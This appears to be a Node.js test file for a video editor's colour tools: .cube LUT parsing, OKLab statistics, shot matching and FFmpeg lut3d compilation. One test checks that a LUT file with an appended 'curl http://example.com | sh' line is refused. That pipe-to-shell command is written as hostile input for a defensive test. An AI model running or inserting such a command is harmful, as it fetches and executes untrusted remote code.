import assert from "node:assert/strict"
import { mkdtempSync, realpathSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { test } from "node:test"

import { apply } from "../src/edit/core/ops.js"
import { compile } from "../src/edit/core/plan.js"
import { balanceOps, CUBE, cubeText, fromOklab, matchCube, MATCH_LIMITS, offAgainst, parseCube, sampleCube, statsOf, toOklab, transport } from "../src/edit/engine/color.js"
import { createEngine } from "../src/edit/engine/index.js"
import { EngineFailure } from "../src/edit/engine/tool.js"
import { openJournal } from "../src/edit/graph/journal.js"
import { makeProject, ms, prng } from "./edit/fixture.js"

// ED13 colour (EDITOR_WORKFLOWS §6): .cube LUTs read and refused, OKLab statistics,
// the Gaussian transport map within limits, per-shot balance as operations, and a
// colour match carried through the compiler to FFmpeg's lut3d. Real frames are in
// tests/edit/media/longform-reference.test.js.

const VERSIONS = { engineVersion: "t", runtimeVersion: "t" }

/** RGB24 pixels from a function of a random 0–1 value: a smooth ramp of one colour cast. */
function pixels(fn, n = 6000, seed = 3) {
  const random = prng(seed)
  const out = new Uint8Array(n * 3)
  for (let i = 0; i < n; i++) out.set(fn(random()).map((v) => Math.max(0, Math.min(255, Math.round(v)))), i * 3)
  return out
}
const neutral = () => pixels((t) => [40 + t * 180, 40 + t * 180, 40 + t * 180])
const darkWarm = () => pixels((t) => [30 + t * 150, 22 + t * 130, 12 + t * 105])

test("a .cube is read exactly, written back the same, and sampled as lut3d samples it", () => {
  const identity = { size: 3, table: Float32Array.from({ length: 81 }, (_, i) => [(Math.floor(i / 3) % 3) / 2, (Math.floor(i / 9) % 3) / 2, Math.floor(i / 27) / 2][i % 3]), min: [0, 0, 0], max: [1, 1, 1] }
  const text = `# a comment\nTITLE "Neutral"\n${cubeText(identity).replace("LUT_3D_SIZE 3", "LUT_3D_SIZE 3\nDOMAIN_MIN 0 0 0\nDOMAIN_MAX 1 1 1")}`
  const lut = parseCube(text)
  assert.deepEqual([lut.title, lut.size, lut.min, lut.max], ["Neutral", 3, [0, 0, 0], [1, 1, 1]])
  assert.deepEqual(Array.from(lut.table), Array.from(identity.table))
  for (const rgb of [[0.1, 0.5, 0.9], [1, 0, 0.25], [0.333, 0.666, 0.999]]) sampleCube(lut, rgb).forEach((v, c) => assert.ok(Math.abs(v - rgb[c]) < 1e-6))
  // Resolve's input range form
  assert.deepEqual(parseCube(cubeText(identity).replace("LUT_3D_SIZE 3", "LUT_3D_SIZE 3\nLUT_3D_INPUT_RANGE 0 1")).max, [1, 1, 1])
})

test("a .cube that is malformed or hostile is refused in plain words, before FFmpeg sees it", () => {
  const good = cubeText({ size: 2, table: new Float32Array(24).fill(0.5) })
  for (const [text, reason] of [
    ["LUT_1D_SIZE 1024\n0 0 0", /1D LUT/],
    [good.replace("LUT_3D_SIZE 2", "LUT_3D_SIZE 1"), /size must be/],
    [good.replace("LUT_3D_SIZE 2", "LUT_3D_SIZE 66"), /size must be/],
    [good.split("\n").slice(0, -2).join("\n"), /7 rows, not 8/],
    [good.replace("0.500000 0.500000 0.500000", "0.5 NaN 0.5"), /isn't three numbers/],
    [good.replace("0.500000 0.500000 0.500000", "0.5 0.5 1e9"), /isn't three numbers/],
    [`${good}curl http://example.com | sh\n`, /doesn't know: "curl"/],
    [good.replace("LUT_3D_SIZE 2", "LUT_3D_SIZE 2\nDOMAIN_MIN 1 1 1"), /domain is empty/],
    ["x".repeat(CUBE.maxBytes + 1), /larger than 16 MB/],
  ])
    assert.throws(() => parseCube(text), (e) => e instanceof RangeError && reason.test(e.message), String(reason))
})

test("OKLab: sRGB round-trips; statistics are numbers only", () => {
  for (const rgb of [[0, 0, 0], [1, 1, 1], [0.2, 0.5, 0.9], [0.9, 0.1, 0.3]]) fromOklab(toOklab(rgb)).forEach((v, c) => assert.ok(Math.abs(v - rgb[c]) < 1e-6))
  const stats = statsOf(neutral())
  assert.ok(Math.abs(stats.mean[1]) < 1e-3 && Math.abs(stats.mean[2]) < 1e-3, "grey has no chroma")
  assert.equal(stats.luma.length, 16)
  assert.ok(Math.abs(stats.luma.reduce((a, b) => a + b, 0) - 1) < 1e-9)
  assert.ok(JSON.stringify(stats).length < 1200, "a handful of numbers, never pixels")
})

test("the transport map is the identity for equal shots, and pulls a dark, warm shot onto a neutral one", () => {
  const n = statsOf(neutral())
  const { matrix } = transport(n, n)
  matrix.forEach((row, i) => row.forEach((v, j) => assert.ok(Math.abs(v - (i === j ? 1 : 0)) < 1e-6)))
  const same = matchCube(n, n, { size: 9 })
  for (let k = 0; k < 9 ** 3; k++) [k % 9, Math.floor(k / 9) % 9, Math.floor(k / 81)].forEach((v, c) => assert.ok(Math.abs(same.table[k * 3 + c] - v / 8) < 1e-6))

  const off = statsOf(darkWarm())
  assert.ok(offAgainst(off, n), "a dark, warm shot is off against a neutral one")
  const lut = matchCube(off, n)
  const fixed = statsOf(pixels((t) => sampleCube(lut, [30 + t * 150, 22 + t * 130, 12 + t * 105].map((v) => Math.round(v) / 255)).map((v) => v * 255)))
  assert.ok(Math.abs(fixed.mean[0] - n.mean[0]) < 0.01, `exposure: ${fixed.mean[0]} against ${n.mean[0]}`)
  assert.ok(Math.hypot(fixed.mean[1], fixed.mean[2]) < 0.005, "white balance: the cast is gone")
  assert.ok(Math.abs(fixed.contrast - n.contrast) < 0.01)
  assert.equal(offAgainst(fixed, n), false)
  // Half strength goes half way
  const half = matchCube(off, n, { strength: 0.5 })
  const halfway = statsOf(pixels((t) => sampleCube(half, [30 + t * 150, 22 + t * 130, 12 + t * 105].map((v) => Math.round(v) / 255)).map((v) => v * 255)))
  assert.ok(halfway.mean[0] > off.mean[0] + 0.04 && halfway.mean[0] < n.mean[0] - 0.04)
})

test("a match corrects, it doesn't restyle: shifts and scales stay inside the limits", () => {
  const black = statsOf(pixels((t) => [2 + t * 6, 2 + t * 6, 2 + t * 6]))
  const vivid = statsOf(pixels((t) => [255, 40 + t * 100, 20]))
  const { matrix, from, to } = transport(black, vivid)
  assert.ok(Math.abs(to[0] - from[0]) <= MATCH_LIMITS.lightness + 1e-9)
  assert.ok(Math.hypot(to[1] - from[1], to[2] - from[2]) <= MATCH_LIMITS.chroma + 1e-9)
  // The map's own scales (its eigenvalues) are inside 0.5–2: its trace and determinant say so
  const trace = matrix[0][0] + matrix[1][1] + matrix[2][2]
  assert.ok(trace >= 1.5 - 1e-9 && trace <= 6 + 1e-9)
})

test("per-shot balance: only a shot that is off against its neighbour is matched, to the last one that wasn't", () => {
  const n = statsOf(neutral())
  const dark = statsOf(darkWarm())
  const near = statsOf(pixels((t) => [42 + t * 180, 41 + t * 180, 40 + t * 180]))
  assert.deepEqual(balanceOps([{ clip: "c1", stats: n }, { clip: "c2", stats: dark }, { clip: "c3", stats: near }, { clip: "c4", stats: dark }]), [
    { op: "match_color", clip: "c2", reference: "c1" },
    { op: "match_color", clip: "c4", reference: "c3" },
  ])
  assert.deepEqual(balanceOps([{ clip: "c1", stats: n }, { clip: "c2", stats: near }]), [])
})

test("a colour match compiles to its two measured ranges, one key for the whole clip, and goes to lut3d", () => {
  const index = { words: [], shots: [] }
  const base = apply(makeProject(), [{ op: "keep_range", asset: "a1", from: 0, to: ms(9000) }, { op: "keep_range", asset: "a1", from: ms(20_000), to: ms(23_000) }]).project
  const [c1, c2] = base.sequences[0].clips.map((c) => c.id)
  const matched = apply(base, [{ op: "match_color", clip: c2, reference: c1 }]).project
  const plan = compile(matched, index, VERSIONS)
  const keys = plan.segments.flatMap((s) => s.node.picture.flatMap((p) => p.effects.filter((e) => e.type === "grade").map((e) => e.match)))
  assert.ok(keys.length >= 1)
  assert.equal(new Set(keys.map((m) => m.key)).size, 1, "every segment of the clip uses one LUT")
  // From the matched clip's whole range to the reference clip's
  assert.deepEqual([keys[0].to.asset, keys[0].to.in, keys[0].from.asset], ["a1", 0, "a1"])
  assert.ok(keys[0].to.out >= ms(8_900) && keys[0].to.out <= ms(9_500))
  assert.ok(keys[0].from.in >= ms(19_500) && keys[0].from.out >= ms(22_900))
  // The reference gone from the cut: said plainly, and the clip plays unmatched
  const gone = apply(matched, [{ op: "ripple_delete", clip: c1 }]).project
  const after = compile(gone, index, VERSIONS)
  assert.ok(after.issues.some((i) => i.code === "match_reference_removed"))
  assert.ok(after.segments.every((s) => s.node.picture.every((p) => p.effects.every((e) => e.match === undefined))))
})

test("a plan with a LUT or a colour match needs the colour pack: an FFmpeg without lut3d fails plainly, before anything runs", async () => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "kriya-color-")))
  writeFileSync(join(root, "a1.mov"), "x")
  const base = apply(makeProject(), [{ op: "keep_range", asset: "a1", from: 0, to: ms(3000) }, { op: "keep_range", asset: "a1", from: ms(5000), to: ms(8000) }]).project
  base.assets[0].path = "a1.mov"
  const [c1, c2] = base.sequences[0].clips.map((c) => c.id)
  const project = apply(base, [{ op: "match_color", clip: c2, reference: c1 }]).project
  const engine = createEngine({ folder: root, roots: [root], cache: join(root, "cache"), exports: join(root, "exports"), journal: openJournal(":memory:"), toolVersion: "t", capabilities: { filters: new Set(), encoders: new Set(["libx264"]) }, free: () => 1e12, run: async () => assert.fail("no tool may run") })
  engine.load(project, {})
  await assert.rejects(engine.render({ quality: "draft" }), (e) => e instanceof EngineFailure && e.reason === "missing_pack" && /lut3d/.test(e.message))
})
